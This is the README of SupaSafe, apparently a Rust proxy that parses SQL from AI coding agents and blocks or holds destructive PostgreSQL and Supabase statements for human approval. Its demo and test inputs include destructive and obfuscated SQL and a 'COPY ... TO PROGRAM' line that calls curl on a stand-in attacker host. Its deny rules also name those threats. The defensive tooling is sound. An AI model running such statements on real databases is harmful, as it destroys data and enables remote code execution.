<div align="center">

# SupaSafe

**AI Database Safety Guard for PostgreSQL and Supabase**

[![CI](https://github.com/jusso-dev/supasafe/actions/workflows/ci.yml/badge.svg)](https://github.com/jusso-dev/supasafe/actions/workflows/ci.yml)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-1.82%2B-orange.svg)](https://www.rust-lang.org)

</div>

---

> **Claude wiped a production database in minutes.**
>
> **SupaSafe exists to ensure AI can never do that again.**

---

SupaSafe sits between your AI coding agents and PostgreSQL. It reads every statement before the database does, works out what that statement would actually destroy, and refuses the ones that would end your week.

<div align="center">

<img src="docs/demo.gif" alt="Claude Code asks SupaSafe to drop a production table. SupaSafe refuses. The table is still there." width="820">

</div>

```
Claude Code ─┐
Codex CLI  ──┤
Cursor     ──┼──▶  SupaSafe  ──▶  Supabase / PostgreSQL
Windsurf   ──┤     (proxy)
Aider      ──┘
```

Your agent connects to SupaSafe instead of the database. Nothing else about its setup changes: SupaSafe speaks the PostgreSQL wire protocol, so every client already knows how to talk to it.

## It is not a firewall

A firewall matches patterns. Patterns lose.

```sql
DROP/**/TABLE users                          -- a pattern for "DROP TABLE" misses this
DELETE FROM users WHERE 1=1                  -- has a WHERE clause, deletes everything
DO $$ BEGIN TRUNCATE users; END $$           -- the truncate is inside a string
INSERT INTO log VALUES ('DROP TABLE users')  -- harmless, but a pattern blocks it
```

SupaSafe parses SQL into a syntax tree and reasons about the tree. The first three are caught. The fourth runs, because it is just an insert. There is no regex anywhere in the decision path, and the parser has a test for each of those four cases.

For the handful of statements PostgreSQL's grammar cannot represent (`DO` blocks, `REINDEX`, `CLUSTER`), SupaSafe falls back to lexical classification over a tokenizer that understands dollar quoting and comments, and marks the result as unverified. Production policy refuses unverified statements rather than guessing at them.

## Run it locally in one command

```sh
git clone https://github.com/jusso-dev/supasafe
cd supasafe
docker compose up --build
```

That gives you the whole thing on your machine: PostgreSQL 16 with a seeded schema, SupaSafe in front of it treating it as production, the proxy on `127.0.0.1:6432` and the dashboard on `http://127.0.0.1:7717`.

The database port is deliberately not published. The only way in is through the proxy, which is the arrangement you want in real life too.

Try it:

```sh
# allowed: a read, and a write with a real WHERE clause
psql postgresql://postgres:postgres@127.0.0.1:6432/postgres -c "SELECT count(*) FROM signups"
psql postgresql://postgres:postgres@127.0.0.1:6432/postgres -c "UPDATE signups SET email='x@y.z' WHERE id = 1"

# blocked
psql postgresql://postgres:postgres@127.0.0.1:6432/postgres -c "DELETE FROM signups"
psql postgresql://postgres:postgres@127.0.0.1:6432/postgres -c "DELETE FROM signups WHERE 1=1"
psql postgresql://postgres:postgres@127.0.0.1:6432/postgres -c "COPY signups TO PROGRAM 'curl evil.example'"
```

```
ERROR:  SupaSafe blocked this statement: it would delete every row from signups
DETAIL:  This statement has no effective WHERE clause, so it rewrites or deletes every row in the table.
HINT:  Do not retry this in another form. Approve it in the SupaSafe dashboard, or write it as a reviewed migration.
```

Then open the dashboard and change a rule. See [Tuning the rules](#tuning-the-rules) below, and [Running with Docker](#running-with-docker) for the details of the setup.

## Quick start without Docker

```sh
cargo install --path crates/supasafe-cli

supasafe start --upstream "postgresql://postgres:...@db.abcdefgh.supabase.co:5432/postgres"
```

```
  SupaSafe 0.1.0
  │ guarding    production (db.abcdefgh.supabase.co/postgres)
  │ environment PRODUCTION
  │ policy      production
  │ agents to   postgresql://…@127.0.0.1:6432/…
  │ dashboard   http://127.0.0.1:7717
```

Point your agent at the proxy:

```sh
export DATABASE_URL="postgresql://postgres:...@127.0.0.1:6432/postgres"
```

That is the whole setup. No configuration file is required. The defaults are the ones you would write yourself after an incident.

## What happens to a statement

Six questions, in order:

| | | |
|---|---|---|
| 1 | **What is it?** | Parsed into an AST. Statement kind, tables, schemas, and whether the `WHERE` clause actually filters anything. |
| 2 | **Where is it going?** | Production, staging, development, local. A database nothing identifies is treated as production. |
| 3 | **How bad is it?** | A score from 0 to 100, with every factor that produced it. |
| 4 | **What does it touch?** | Rows, cascading foreign keys, locks, WAL, and the tables the statement never mentions. |
| 5 | **Is it allowed?** | An allow-list, evaluated in order. |
| 6 | **How do we get back?** | Reverse SQL where one exists, an honest "you cannot" where none does. |

Then it is written to a hash-chained audit log, and if a human is needed, one is asked.

## Risk scores

The score is a property of the statement, not the environment. `DROP TABLE` is a 100 on your laptop and a 100 in production. What changes is the policy that reads the number.

| Statement | Score |
|---|---|
| `SELECT ...` | 0 |
| `INSERT INTO ...` | 15 |
| `UPDATE ... WHERE id = $1` | 10 |
| `DELETE FROM ... WHERE id = $1` | 20 |
| `UPDATE ...` with no effective `WHERE` | 98 |
| `DELETE FROM ...` with no effective `WHERE` | 100 |
| `TRUNCATE` | 95, or 100 with `CASCADE` |
| `ALTER TABLE ... DROP COLUMN` | 98 |
| `DROP TABLE` / `DROP SCHEMA` / `DROP DATABASE` | 100 |
| `ALTER TABLE ... DISABLE ROW LEVEL SECURITY` | at least 90 |
| `ALTER ROLE ... SUPERUSER` | at least 95 |
| `COPY ... TO PROGRAM` | 100 |
| anything writing to `auth.*` or `storage.*` | 100 |

"No effective `WHERE`" is the phrase that matters. `WHERE 1=1`, `WHERE true`, and `WHERE email = 'x' OR 1=1` all constant-fold to true, and all score the same as no `WHERE` clause at all.

Every score comes with its reasoning:

```sh
$ supasafe analyze "DELETE FROM users WHERE 1=1" --environment production

  HELD FOR APPROVAL  under the production policy in production

  risk 100 (catastrophic)  delete every row from users
  DELETE FROM users WHERE 1=1

    · This statement has no effective WHERE clause, so it rewrites or deletes
      every row in the table.

    blast radius: about 8412 rows across 1 table, cascading into 2 more
    rollback: this can only be reversed from a copy of the data taken beforehand
```

`supasafe analyze` exits non-zero when a statement would be blocked, so it works in CI and in a pre-commit hook.

## Tuning the rules

Rules are the part you will actually touch. There are two ways to change them, they edit the same thing, and both take effect on the next statement without restarting anything.

### From the dashboard

Open `http://127.0.0.1:7717` and scroll to **Rules the proxy enforces**.

<table>
<tr><td width="180"><b>Pick a policy</b></td><td>The dropdown lists <code>development</code>, <code>staging</code>, <code>production</code>, <code>regulated</code> and anything you have added.</td></tr>
<tr><td><b>Thresholds</b></td><td>The row of boxes across the top: default action, warn above, approval above, refuse above, approvers needed, snapshot above, approval timeout, and the two guards. Change one and it saves immediately.</td></tr>
<tr><td><b>Rules, in order</b></td><td>Numbered, because the first match wins. Each shows its action, its name, its match conditions in words, and the message a blocked agent will see.</td></tr>
<tr><td><b>↑ ↓</b></td><td>Move a rule earlier or later. This is the most common fix: a rule that never fires is usually sitting behind one that already matched.</td></tr>
<tr><td><b>Add a rule</b></td><td>Opens the editor: name, action, message, and the match conditions as dropdowns built from SupaSafe's own vocabulary, so the options are always current.</td></tr>
<tr><td><b>Test</b></td><td>Inside the editor. Paste a statement and see what happens with and without your draft, before you save it.</td></tr>
<tr><td><b>Edit as TOML</b></td><td>The whole config in a text box, parsed and compiled before anything is saved.</td></tr>
</table>

The test box is the part worth using. Tuning a rule you cannot try out is guesswork, and guessing about a `deny` rule in production is how you discover it matched more than you meant:

```
as it is now      allow    risk 0
with this rule    deny     risk 0 · matched "no-secrets"
```

If a draft rule does not change the outcome, the dashboard says so rather than letting you save something that does nothing.

Every change is written straight back to `supasafe.toml`. What is on screen and what is on disk do not drift apart, and the file is still the source of truth you can commit to a repo.

### From `supasafe.toml`

The same thing in a file. Rules you write are placed **in front of** the built-in ones, so adding a rule adds a rule, rather than replacing the twelve that were already there:

```toml
[[policies.production.rules]]
name = "billing-is-off-limits"
action = "deny"
message = "The billing schema is reconciled nightly. Changes go through finance."
when = { objects = ["billing.*"], categories = ["write", "ddl"] }
```

Reload without restarting, from the dashboard's **Reload file** button or:

```sh
curl -X POST http://127.0.0.1:7717/api/config/reload
```

Check what is in force, in order:

```sh
supasafe policy production
```

### What you can match on

Every field that is set must match. Fields left out do not constrain.

| | |
|---|---|
| `kinds` | `["drop_table", "truncate", "update"]` and about seventy more |
| `categories` | `read`, `write`, `ddl`, `dcl`, `maintenance`, `transaction`, `session`, `execute` |
| `objects` | globs against `schema.object`: `["auth.*", "public.audit_*"]` |
| `schemas` | schema names |
| `surfaces` | `["supabase_auth", "supabase_storage", ...]` |
| `flags` / `any_flags` | `cascade`, `drops_column`, `weakens_rls`, `copy_program`, `grants_elevated_role`, `security_definer`, `opaque_body`, and twenty others |
| `min_risk` / `max_risk` / `level` | score bounds, or a band by name |
| `unfiltered` | `true` matches writes with no effective `WHERE` |
| `unparsed` | `true` matches statements the grammar rejected |
| `environments` | `["production", "staging"]` |
| `agents` | globs against `application_name` |

Four actions: `allow`, `warn`, `require_approval` (with an optional `approvals` count), `deny`.

The full reference, with worked examples, is in [docs/policies.md](docs/policies.md).

### Some rules worth having

Protect a schema absolutely:

```toml
[[policies.production.rules]]
name = "billing-is-off-limits"
action = "deny"
message = "The billing schema is reconciled nightly. Changes go through finance."
when = { objects = ["billing.*"], categories = ["write", "ddl"] }
```

Two people for anything touching money:

```toml
[[policies.production.rules]]
name = "money-needs-two-people"
action = "require_approval"
approvals = 2
when = { objects = ["public.payments", "public.invoices", "public.ledger_*"] }
```

Let a reviewed migration runner through without a prompt. Note that `application_name` is not authentication: anyone who can connect can claim any name, so this is a convenience on a trusted network, not a security boundary.

```toml
[[policies.production.rules]]
name = "migration-runner"
action = "allow"
when = { agents = ["migration-runner"], categories = ["ddl"], max_risk = 79 }
```

Refuse anything an agent could not explain:

```toml
[[policies.production.rules]]
name = "no-dynamic-sql"
action = "deny"
message = "SupaSafe cannot see inside a DO block or a dynamic EXECUTE. Write the statements out."
when = { any_flags = ["opaque_body"] }
```

### What editing cannot do

Two guards run before any rule, and no rule can get past them. A blanket `allow` rule still does not open Supabase's `auth` schema, and still does not let through a statement SupaSafe could not parse. Turning those off is a deliberate change to `protect_managed_surfaces` or `deny_unparsed`, not something a rule can do by accident.

An edit that would not compile, a glob with a syntax error, an unknown action, is refused with a message and changes nothing. The running policy is only ever replaced by one that has already compiled.

If the dashboard is reachable from anywhere but your own machine, turn editing off:

```toml
[server]
allow_policy_editing = false
```

Rules stay visible and testable; they just cannot be saved.

## Policies

Four ship in the box. Production is an allow-list: statements run because a rule permits them, not because no rule objected.

| Policy | Behaviour |
|---|---|
| `development` | Everything runs. Everything is recorded. |
| `staging` | Everything runs. Anything scoring above 25 is flagged. |
| `production` | Reads and scoped writes run. Everything else needs a human. Some things are refused outright. |
| `regulated` | Two separate approvers for every change, and a snapshot first. |

Refused outright in production, with no approval path:

- `COPY ... TO PROGRAM`, which is remote code execution on the database host
- granting `SUPERUSER`, `BYPASSRLS` or `REPLICATION`
- anything that modifies Supabase's `auth`, `storage`, `vault` or `supabase_migrations` schemas
- statements SupaSafe could not parse

Held for approval:

- `DROP TABLE`, `DROP SCHEMA`, `DROP DATABASE`, `TRUNCATE`
- `UPDATE` or `DELETE` with no effective `WHERE`
- dropping a column, changing an owner, weakening row level security
- every other schema change

Write your own in `supasafe.toml`:

```toml
[[policies.production.rules]]
name = "billing-is-off-limits"
action = "deny"
message = "The billing schema is reconciled nightly. Changes go through finance."
when = { objects = ["billing.*"], categories = ["write", "ddl"] }
```

Run `supasafe policy production` to see every rule in force, in order.

## Supabase

SupaSafe knows what lives in a Supabase project, because Supabase keeps critical machinery in ordinary PostgreSQL schemas where it looks like anything else.

- **`auth`** is refused outright. Every user account, session and refresh token is in there. Dropping a table in `auth` logs out your entire user base and cannot be undone from the application side.
- **`storage`** is refused. Losing the object metadata orphans every uploaded file.
- **`vault`**, **`supabase_migrations`**, **`realtime`** and PostgreSQL's own catalogs are protected the same way.
- Dropping an RLS policy or running `DISABLE ROW LEVEL SECURITY` scores at least 90, because on Supabase that exposes the table to anyone holding the anon key.
- Project references are detected from both direct (`db.<ref>.supabase.co`) and pooled (`postgres.<ref>@...pooler.supabase.com`) connection strings.

## Blast radius

Give SupaSafe a read-only connection and it stops estimating:

```toml
[proxy]
introspection_url = "postgresql://supasafe_readonly:...@db.abcdefgh.supabase.co/postgres"
```

SupaSafe connects with those credentials on startup and refreshes every five minutes, reading `pg_class`, `pg_constraint` and `pg_index`. Row counts come from `reltuples`, which is what the planner uses and is approximate by definition.

Now an approval card says what will actually happen:

```
DELETE FROM signups

  rows        88,412
  measured    true
  lock        ROW EXCLUSIVE
  wal         10,609,440 bytes

  public.signups              8,412 rows  →  0
  cascades into public.orders       via orders_signup_id_fkey (cascade)
  cascades into public.order_items  via order_items_order_id_fkey (cascade)

  ! 2 table(s) will be modified through ON DELETE CASCADE without appearing
    in the statement: public.orders, public.order_items
```

Without it, SupaSafe says `measured: false` and warns on every card, rather than inventing numbers.

The introspection connection is separate from the one agents use, and it is the credential snapshots run under too. Grant it deliberately:

```sql
CREATE ROLE supasafe_readonly LOGIN PASSWORD '...';
GRANT pg_read_all_stats TO supasafe_readonly;
GRANT USAGE ON SCHEMA public TO supasafe_readonly;
```

## Approvals

A held statement stops in the proxy and appears on the dashboard at `http://127.0.0.1:7717`, with the SQL, the tables, the estimated rows, the reason, the risk, and how to undo it. Approve it, reject it, or edit the SQL and approve that instead. An edited statement is re-analysed before it runs, because a human under time pressure is not a policy engine.

From a terminal:

```sh
$ supasafe approve
  risk 100  claude-code wants to permanently remove the table signups on postgres
      DROP TABLE signups
      supasafe approve 16cbadb9-f205-4746-a228-1b3c81044aac

$ supasafe approve 16cbadb9-f205-4746-a228-1b3c81044aac --approver alice
✓ request 16cbadb9-f205-4746-a228-1b3c81044aac is now approved
```

Nobody answers, nothing runs. Silence is a refusal, not a default yes.

## Audit

Every decision is appended to a hash-chained log. Each record carries the hash of the one before it, so removing or editing an entry breaks every hash after it.

```sh
$ supasafe audit --verify
✓ 4 record(s), chain intact
  head 4f6689d4e000954d

$ supasafe audit
  time                 agent          risk  decision   outcome    statement
  2026-07-30 00:06:26  claude-code     100  deny       blocked    COPY DEMO_USERS TO PROGRAM ?
  2026-07-30 00:06:26  claude-code      10  allow      executed   UPDATE DEMO_USERS SET EMAIL=? WHERE ID=?
  2026-07-30 00:06:26  claude-code      15  allow      executed   INSERT INTO DEMO_USERS (EMAIL) VALUES (?)
  2026-07-30 00:06:26  claude-code       0  allow      executed   SELECT ?
```

Note the `?`. By default the trail stores normalised SQL, not literals. An audit log that copies every value is a second, less protected copy of the data it is supposed to be guarding.

This is tamper evidence, not tamper proofing. Anyone who can write the file can rewrite the whole chain. What it buys you is that they cannot do it selectively and quietly, which is the realistic threat when somebody is cleaning up after themselves.

## MCP server

The proxy is the backstop and does not rely on the model cooperating. The MCP server is the cooperative path: an agent that asks first can fix its own SQL without a human ever seeing a blocked query.

```json
{
  "mcpServers": {
    "supasafe": {
      "command": "supasafe",
      "args": ["mcp", "--upstream", "postgresql://postgres@db.abcdefgh.supabase.co/postgres"]
    }
  }
}
```

Seven tools: `analyze_sql`, `estimate_risk`, `preview_sql`, `request_approval`, `list_policies`, `create_snapshot`, `rollback`. On connect it also hands the agent its standing instructions for the database it is pointed at, which you can print yourself:

```sh
supasafe context --target "postgresql://...@db.abcdefgh.supabase.co/postgres" >> CLAUDE.md
```

## What SupaSafe never sees

The authentication exchange is relayed between client and server byte for byte, whether that is SCRAM, MD5 or anything else. SupaSafe does not hold your database password, and there is no credential in the process to leak.

TLS terminates on both sides when you configure it, including certificate pinning against the upstream. A pin mismatch drops the connection before the startup packet is sent, so a server presenting the wrong certificate never learns a username.

## Running with Docker

The compose file at the repo root brings up everything.

```sh
docker compose up --build
```

| | |
|---|---|
| `postgres` | PostgreSQL 16, seeded from `examples/docker/seed.sql`: 8,412 signups, 20,000 orders, 60,000 order items, wired together with `ON DELETE CASCADE`. Its port is **not** published. |
| `supasafe` | The proxy on `127.0.0.1:6432` and the dashboard on `127.0.0.1:7717`, with `examples/docker/supasafe.toml` mounted read-write so rule edits persist. |

Both ports bind to loopback, not `0.0.0.0`. The dashboard can change what the proxy lets through, so it is not something to expose by accident.

### What the seed data is for

The foreign keys cascade, so blast radius is measured rather than illustrated. The compose file gives SupaSafe a read-only introspection connection, which is what turns estimates into numbers:

```
DELETE FROM signups

  risk        100 (catastrophic)
  rows        88,412
  measured    true
  lock        ROW EXCLUSIVE
  wal         10,609,440 bytes

  public.signups              8,412 rows  →  0
  cascades into public.orders       via orders_signup_id_fkey (cascade)
  cascades into public.order_items  via order_items_order_id_fkey (cascade)

  ! 2 table(s) will be modified through ON DELETE CASCADE without appearing
    in the statement: public.orders, public.order_items
```

Two of those tables are not mentioned in the statement. That is the output from the compose stack, not an illustration.

### Working against it

```sh
export DATABASE_URL="postgresql://postgres:postgres@127.0.0.1:6432/postgres?application_name=claude-code"

psql "$DATABASE_URL" -c "SELECT count(*) FROM signups"      # allowed
psql "$DATABASE_URL" -c "DELETE FROM signups"               # held for approval
```

The held statement appears on the dashboard with the rows, the cascade, the lock and the rollback advice. Approve it there, or from a second terminal:

```sh
docker compose exec supasafe supasafe approve
docker compose exec supasafe supasafe approve <id> --approver you
```

Read the trail, and check nobody has edited it:

```sh
docker compose exec supasafe supasafe audit
docker compose exec supasafe supasafe audit --verify
```

### The image

```sh
docker build -t supasafe .
docker run --rm -p 127.0.0.1:6432:6432 -p 127.0.0.1:7717:7717 \
  -v "$PWD/supasafe.toml:/etc/supasafe/supasafe.toml" \
  supasafe --config /etc/supasafe/supasafe.toml start \
    --upstream "postgresql://postgres:...@db.abcdefgh.supabase.co:5432/postgres" \
    --listen 0.0.0.0:6432 --dashboard 0.0.0.0:7717
```

Two stages. The first compiles with `rust:1-slim-bookworm` and installs nothing: SupaSafe has no C dependencies, so there is no OpenSSL or libpq to build against.

The second is the official `postgres:16-bookworm` image. That is heavier than a bare `debian:slim`, deliberately:

- `pg_dump` is present, so snapshots copy data instead of recording a marker and hoping you have backups.
- `pg_dump` is the same major version as the server you are guarding, and `pg_dump` refuses to dump from a server newer than itself. Getting this wrong turns your recovery point into an error message at the worst possible moment.
- No package installation at build time, so the image builds even where a Debian mirror is unreachable.

Match the tag to your server: `postgres:15-bookworm`, `postgres:17-bookworm`, and so on.

The container runs as the unprivileged `postgres` user, and writes only to `/var/lib/supasafe`.

### Pointing it at a real database

Change one line. The compose file's `--upstream` is the only thing tying it to the local PostgreSQL:

```yaml
    command:
      - --config
      - /etc/supasafe/supasafe.toml
      - start
      - --upstream
      - postgresql://postgres:...@db.abcdefgh.supabase.co:5432/postgres
      - --listen
      - 0.0.0.0:6432
      - --dashboard
      - 0.0.0.0:7717
```

Then drop the `postgres` service and its `depends_on`, and remove `upstream_tls = false` from `examples/docker/supasafe.toml`, which is only there because the local database is on the container network with nothing to protect.

Put the password in the environment rather than the compose file:

```yaml
    environment:
      SUPASAFE_UPSTREAM: ${DATABASE_URL:?set DATABASE_URL}
```

### Persistence

| Volume | Holds |
|---|---|
| `supasafe-state` | The audit trail at `/var/lib/supasafe/audit.jsonl` and snapshots under `/var/lib/supasafe/snapshots` |
| `./examples/docker/supasafe.toml` | Mounted read-write: rule changes made in the dashboard are written here and survive a restart |
| `pgdata` | The demo database |

Start over with `docker compose down -v`.

### Troubleshooting

**Everything is blocked, including reads.** The compose file declares the database as production on purpose, so you can see the production policy work. Change the `[[database]]` entry in `examples/docker/supasafe.toml` to `environment = "development"`, or pick a different policy in the dashboard.

**A statement hangs for five minutes then fails.** It needed approval and nobody gave it. That is the design: silence is a refusal. Approve it in the dashboard, or shorten `approval_timeout_seconds`.

**Row counts say "unknown".** `introspection_url` is not set or the role cannot read `pg_class`. The compose file sets it for you.

**Dashboard edits will not save.** SupaSafe needs a config file to write to. The compose file mounts one read-write; if you changed that mount to `:ro`, the dashboard will say so rather than pretending to save.

## Everything else

| | |
|---|---|
| [Configuration](docs/configuration.md) | `supasafe.toml` in full |
| [Docker](#running-with-docker) | Running the whole thing locally |
| [Policies](docs/policies.md) | Writing rules, matchers, worked examples |
| [Risk engine](docs/risk.md) | How every score is derived |
| [Architecture](docs/architecture.md) | How the pieces fit, and the threat model |
| [Clients](docs/clients.md) | Setup for Claude Code, Codex, Cursor, Windsurf, Aider, Goose, OpenCode, Hermes |
| [VS Code extension](extensions/vscode) | Analyse a selection, approve from the editor |
| [Examples](examples) | Docker Compose, CI checks, sample configs |

## Building

```sh
cargo test --workspace          # 307 tests, no database needed

# the end-to-end tests drive a real psql against a real server, and the
# introspection test reads that server's catalogues
SUPASAFE_TEST_PG=postgresql://postgres@127.0.0.1:5432/postgres cargo test --workspace
```

Rust, with no `unsafe` anywhere in the workspace.

## Honest limitations

- Blast radius is a structural estimate until you set `introspection_url`. It tells you which one it is doing on every card.
- Row estimates come from `pg_class.reltuples`, which is what the planner uses and is approximate by definition. A table that has never been analysed reports zero.
- The introspection client speaks trust, cleartext, MD5 and SCRAM-SHA-256. Kerberos and GSSAPI are refused with a message rather than half-supported.
- Fast-path function calls (the binary protocol for calling a function by OID) are refused rather than analysed, because they carry no SQL. Modern clients only use them for large objects.
- A statement that passes policy is forwarded unchanged. SupaSafe decides whether something runs, not what it does once it is running.
- If an agent has credentials for the database directly, it can go around the proxy. Give agents the proxy's address and nothing else.

## Licence

Apache-2.0. See [LICENSE](LICENSE).
